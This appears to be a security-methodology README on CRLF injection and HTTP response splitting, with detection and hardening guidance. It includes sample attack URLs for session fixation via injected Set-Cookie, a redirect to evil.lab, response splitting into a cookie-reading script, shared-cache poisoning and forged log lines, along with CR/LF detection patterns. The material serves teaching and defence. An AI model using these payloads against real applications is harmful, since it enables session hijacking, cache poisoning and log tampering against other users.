> **English** | [Italiano](README.md)

# CRLF Injection (HTTP Response Splitting / Header Injection)

> - **Phase:** Web Exploitation - OWASP A03:2021 Injection (injection of CR/LF characters into headers or logs)
> - **Visibility:** Low/Medium - requests with encoded CRLF sequences in the parameters; anomalous response headers or malformed log entries
> - **Prerequisites:** an application that reflects user input into an HTTP response header (e.g., `Location` in a redirect, `Set-Cookie`, a custom header) or into a log file, without filtering CR/LF
> - **Nature of the document:** methodology. Illustrative payloads (OWASP didactic form), no fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: inject the end-of-line characters CR (`%0d`) and LF (`%0a`) to add arbitrary headers, split the HTTP response (response splitting), poison caches and logs, or chain a reflected XSS.

---

## Executive Summary

The HTTP protocol separates headers and body with CRLF sequences (`\r\n`). If an application inserts user input
into a response header without removing CR/LF, an attacker can inject `%0d%0a` and "break" the response's
structure: add arbitrary headers (`Set-Cookie`, redirects), inject a second response body (HTTP response
splitting), or, if the response is cached, serve malicious content to other users (cache poisoning). The same
technique, applied to a value that ends up in a **log** file, allows forging or falsifying log entries (log
injection).

The impacts range from low (manipulated redirect, header spoofing) to medium/high (cache poisoning toward all
users, reflected XSS via response splitting, log falsification for anti-forensics). The typical severity is
`Medium`, with escalation to `High` when the response is cacheable or the splitting leads to XSS.

## Operational context (why, before how)

CRLF Injection is sought wherever a parameter ends up in a response header: redirects (`Location`), cookie
setting, language/tracking headers, and in systems that log unfiltered input. The operational decision is to
understand where the input is reflected (header vs log) and whether the response is cacheable: it is the
difference between an impact limited to a single user and one affecting all visitors (cache poisoning). The test
is minimal and non-destructive: you inject a CRLF sequence with an innocuous header and check whether it appears
in the response.

## Execution / Commands

### Phase 1 - Confirm the vulnerability

You inject an encoded CRLF sequence followed by an innocuous test header into a parameter reflected in a header
(e.g., the target of a redirect):

```
# parameter value (didactic form, innocuous test header)
%0d%0aX-Injected-Test:%20crlf-ok
```

Illustrative output (representative, response headers):

```
HTTP/1.1 302 Found
Location: /home
X-Injected-Test: crlf-ok        <-- the injected header appears: CRLF injection confirmed
```

### Phase 2 - Impacts (payloads)

Value injected into a parameter reflected in a header (e.g., the target of a redirect). `%0d%0a` = CRLF:

```
# Header injection: set a session cookie chosen by the attacker (session fixation)
/redirect?url=%0d%0aSet-Cookie:%20SESSIONID=attacker_fixed_value

# Open redirect / header spoofing
/redirect?url=%0d%0aLocation:%20https://evil.lab

# HTTP response splitting: a double CRLF closes the headers and injects a controlled body -> reflected XSS
/redirect?url=%0d%0a%0d%0a<script>alert(document.cookie)</script>

# Full variant (status + headers + body) to poison a shared cache
/x?p=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Log injection: inject a fake log line / break parsing (anti-forensics)
/login?user=admin%0d%0a2026-01-01%2000:00:00%20INFO%20successful%20login%20for%20admin
```

If the poisoned response ends up in a shared **cache**, the malicious content is served to other users (cache
poisoning). The principle is always the injection of `%0d%0a` to break out of the intended context (a header, a
log line) and inject controlled structure.

## Analysis of results

The confirmation (Phase 1) proves that the input reaches the headers without CR/LF filtering. The real impact
depends on the context: `Low` for simple header spoofing or a redirect; `Medium` for session fixation or log
injection; `High` when the response is cacheable (cache poisoning toward all users) or when response splitting
enables reflected XSS. If the framework rejects CR/LF in headers (the default behavior of many modern stacks),
the vector is closed.

### Theoretical Analysis

CRLF Injection is the data/instructions problem [Su & Wassermann 2006] applied to the structure of the HTTP
protocol: CR/LF are the syntactic delimiters between headers and between headers and body. If the user input
(data) can contain those delimiters, the user controls the structure of the response (code). The countermeasure
is to remove or encode CR/LF in input destined for headers and logs, or - better - to use APIs that build
headers in a structured way and reject newlines (most modern frameworks do this by default). It also applies to
logs: treat the input as data, not as a log line.

## Remediation (Blue Team)

**Detection (WAF/SIEM).**
- Parameters containing `%0d`, `%0a`, `\r`, `\n` or encoded variants (double URL-encoding).
- Unexpected or duplicated response headers; responses with an anomalous structure.
- Log entries with injected newlines or "impossible" lines (sign of log injection).

**Hardening (secure coding).**
- Do not insert untrusted input into response headers; if indispensable, remove/encode CR/LF (the primary
  countermeasure).
- Use the framework APIs to set headers and cookies (most reject newlines).
- Validate redirect targets (whitelist) and sanitize input that ends up in logs.
- Configure caches correctly so they do not store responses influenced by untrusted input.

---

## Real-World Scenario: Post-Exploitation Projection

> Applies to the outcomes with escalation (cache poisoning / XSS via response splitting, severity High).

### Attacker Perspective (Red Team)

**Starting point:** a parameter reflected in a response header, without CR/LF filtering (confirmed in Phase 1).

**Immediate next step:** if the response is cacheable, build a cache poisoning; otherwise attempt session
fixation or response splitting toward XSS.

**Projected Kill Chain:**

```
CRLF Injection in a response header
        |
        v
Response splitting / cache poisoning (if the response is cacheable)
        |
        v
Malicious content served to other users (reflected XSS persisted in cache)
        |
        v
Theft of sessions / credentials of the affected users (see XSS)
```

**Potential impact:** from manipulation of a single response to impact on many users when the cache is involved;
the natural link is with [XSS](<../xss (Cross-Site Scripting)/README.en.md>).

**Typical monetization vectors:** mass session theft; defacement via cache; misdirection through falsified logs.

### Defender Perspective (Blue Team)

**Detection:** encoded CRLF in the parameters; anomalous response headers; logs with injected newlines.

**Indicators of Compromise (IOC):**
- Parameters with `%0d%0a` or double encoding.
- HTTP responses with duplicated headers or unexpected bodies.
- Broken or inconsistent log entries.

**Containment:** block the pattern via WAF; invalidate potentially poisoned caches; review suspicious logs.

**Eradication and hardening:** CR/LF filtering; structured APIs for headers/cookies; redirect whitelist; log
sanitization; correct cache configuration.

**Defensive lesson:** CRLF Injection shows that even the "invisible" delimiters of a protocol are an attack
surface. The defense is to treat input as data even when it ends up in a header or a log, never as part of the
structure.

---

## Reference tools

| Tool | Type | Technique/Access | Main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | Proxy/scanner | Web - Active | Intercepts and modifies the parameters; test of CRLF injection into headers |
| `curl` | HTTP client | CLI - Active | Manual sending of requests with encoded CRLF sequences |
| `crlfuzz` | CRLF scanner | CLI - Active | Automated scanning of endpoints for CRLF injection |

## Methodology notes

In a real lab (e.g., an app with a parameter-based redirect or a didactic target) the data to document as a
finding: the confirmation of the injected header, the context (header vs log) and any escalation (cache/XSS). The
payloads shown are innocuous test headers; the complete operational forms are not reproduced.

## MITRE ATT&CK mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Injection of CR/LF into a response header of an exposed application. |
| Impact | Data Manipulation: Stored Data Manipulation | `T1565.001` | Cache poisoning and falsification of log entries via response splitting / log injection. |

---

## Links to other findings

| Source | This technique | Effect |
| :--- | :--- | :--- |
| [02-web-recon](<../../02-web-recon (Enumeration)/README.en.md>) | CRLF Injection | enumeration identifies redirects and endpoints that reflect input into headers |
| CRLF Injection (response splitting) | [XSS](<../xss (Cross-Site Scripting)/README.en.md>) | the splitting can introduce a controlled body from which a reflected XSS starts |
| CRLF Injection | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.en.md>) | the remediation (CR/LF filtering, structured APIs) links to the secure coding lab |

---

> **Note:** All described techniques are for educational and methodology-documentation purposes. Execution only on owned applications or with explicit authorization. The payloads are illustrative and do not come from real or third-party systems.
